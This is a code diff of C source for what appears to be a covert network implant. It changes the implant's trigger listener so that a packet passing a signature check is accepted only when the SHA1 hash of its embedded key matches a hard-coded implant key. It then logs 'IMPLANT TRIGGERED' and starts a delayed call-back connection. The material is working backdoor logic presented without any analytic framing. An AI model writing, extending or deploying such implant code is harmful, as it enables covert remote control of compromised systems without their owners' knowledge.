@@ -15,6 +15,7 @@
 #include <string.h>
 #include <signal.h>
 #include "polarssl/havege.h"
+#include "polarssl/sha1.h"
 
 #if defined LINUX || defined SOLARIS
 #include <unistd.h>
@@ -36,6 +37,8 @@
 #ifdef DEBUG
 #include <arpa/inet.h>
 #endif
+
+extern unsigned char	implantKey[ID_KEY_HASH_SIZE];
 
 //******************************************************************
 //given a range will calculate a psuedo random variance
@@ -111,10 +114,6 @@ void TriggerDelay(int trigger_delay)
 void* start_triggered_connect( void *param )
 {
 	TriggerInfo	tParams;
-	struct in_addr	addrin;
-	char		*adrbuf;	// address
-	uint16_t	tb_id;		// port
-//	Payload			*recvd_payload;		// Not used
 
 	// copy the parameters to the local stack and release the memory
 	// now so we don't forget to do it later.
@@ -227,6 +226,8 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 		{
 			if ( dt_signature_check( packet_buffer, packet_length, &recvd_payload) != FAILURE )
 			{
+				unsigned char	recvdKey[ID_KEY_HASH_SIZE];
+
 				D( printf( "%s, %4d: Trigger signature found, about to send call back (will wait for trigger_delay)\n", __FILE__, __LINE__); )
 				// this memory is free'd in the thread
 				tParams = calloc( 1, sizeof( TriggerInfo ) );
@@ -241,6 +242,14 @@ int TriggerListen( char *iface, int trigger_delay, unsigned long delete_delay )
 					free(tParams);
 					return FAILURE;
 				}
+
+				sha1(tParams->idKey_hash, strlen((const char *)(tParams->idKey_hash)), recvdKey);
+				if ( memcmp(recvdKey, implantKey, ID_KEY_HASH_SIZE) )	{// Compare keys. Trigger if identical; otherwise continue waiting for a match.
+					D( printf("\n%s, %4d: TRIGGER FAILED: Key mismatch.\n\n", __FILE__, __LINE__); );
+					continue;
+				}
+				D( printf("\n===============================================\n%s, %4d: IMPLANT TRIGGERED\n===============================================\n\n",
+						__FILE__, __LINE__); );
 
 				tParams->delay = trigger_delay;
 
